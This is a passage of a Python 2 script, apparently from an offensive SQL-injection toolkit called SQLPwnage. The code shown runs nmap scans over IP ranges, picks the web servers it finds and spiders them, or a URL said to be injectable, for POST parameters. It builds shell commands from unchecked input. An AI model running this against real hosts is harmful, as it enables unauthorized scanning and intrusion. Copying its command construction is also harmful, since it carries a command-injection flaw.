					print "[-] Sorry, no POST parameters were identified on this site [-]"			
			elif (test == '2'):
				print
                                try:
                                   ipaddr=sys.argv[5]
                                except Exception:
         				ipaddr=raw_input("Enter the ip range, example 192.168.1.1-254: ")
				cmd = 'sudo nmap -sT -v -PN -p80 ' + ipaddr + ' > %s/bin/ftsrc/sqlpwnage/app/webscan.txt 2> /dev/null' % (definepath)
				os.system(cmd)
				scanres=os.popen("grep \"Discovered\" %s/bin/ftsrc/sqlpwnage/app/webscan.txt" % (definepath)).read()
				if not scanres:
   					print "\nNo WebServers were found...Sorry.\n"
				else:
					cmd = 'grep "Discovered" %s/bin/ftsrc/sqlpwnage/app/webscan.txt | cut -c32-47 > %s/bin/ftsrc/sqlpwnage/app/webopen.txt' % (definepath,definepath)
					os.system(cmd)
					if not scanres:
   						print "\nWebserver found, but does not resolve...Sorry.\n"
					else:
						print
						option3 = raw_input("""Scanning Complete!!! Select a website to spider or spider all??\n\n	1. Single Website\n	2. All Websites\n\n	Enter the Number: """)
						if (option3 == '1'):
							print
							print ("List of Available Hosts:")
							print
							webrange = open('%s/bin/ftsrc/sqlpwnage/app/webopen.txt' % (definepath), 'r')
							x = 1
							for line in webrange.readlines():
								line=line.rstrip()
								print '\t' + str(x) + '. ' + " " + line
								compsystem=open("%scomp" % (x), "w")
								compsystem.write(line)
								compsystem.close()
								x = x + 1
							print
							host = raw_input("Enter the number corresponding to the hostname you would like to attempt to spider: ")
							selection = open(host + "comp", "r")
							for line in selection.readlines():
								line=line.strip()
								opt="http://" + line
								Crawl_URL(opt, choice, 0)
						if (option3 == '2'):
							webrange=open('%s/bin/ftsrc/sqlpwnage/app/webopen.txt'  %(definepath), 'r')
							for line in webrange.readlines():
								line=line.strip()
								opt="http://" + line
								request = urllib2.Request(opt)
								try:
									print "Attempting to Spider: " + opt
									response = urllib2.urlopen(request)
									Crawl_URL(opt, choice, 0)	
								except urllib2.URLError:
									print
									print "[-] Sorry, no POST parameters were identified on the site. [-]"	
			elif (test == '3'):
						print
						print ("List of Available Hosts:")
						print
						webrange = open('%s/bin/ftsrc/sqlpwnage/app/webopen.txt' % (definepath), 'r')
						x = 1
						for line in webrange.readlines():
							line=line.rstrip()
							print '\t' + str(x) + '. ' + line
							compsystem=open("%s/bin/ftsrc/sqlpwnage/app/%scomp" % (definepath,x), "w")
							compsystem.write(line)
							compsystem.close()
							x = x + 1
						print
						host = raw_input("Enter the number corresponding to the hostname you would like to attempt to spider: ")
						selection = open(host + "comp", "r")
						for line in selection.readlines():
							line=line.strip()
							opt="http://" + line
							Crawl_URL(opt, choice, 0)
			else:
				print
				print "***********************************************************"
				print "Not a Valid Choice!!  Please re-enter a valid menu option."
				print "***********************************************************"

		elif choice == '3':
				print
				###############################################################
				###############################################################
				#User Inputs Website
				###############################################################
                                try:
                                   option=sys.argv[4]
                                except IndexError:
             				option = raw_input("Enter URL that is susceptible to SQL Injection (ex: www.xxxxx.com): ")
				opt = ("http://"+option)
				request = urllib2.Request(opt)
				try:
					response = urllib2.urlopen(request)
					Crawl_URL(opt, choice, 0)
				except urllib2.URLError:
					print
					print "[-] Sorry, no post parameters were identified on this site. [-]"	

		else:
			print "***********************************************************"
			print "Not a Valid Choice!!  Please re-enter a valid menu option."
			print "***********************************************************"
except Exception,e:
  print e
remold=subprocess.Popen("rm bin/appdata/ipaddr 2> /dev/null", shell=True).wait()
endingpoint=raw_input("Press enter to exit SQLPwnage.")
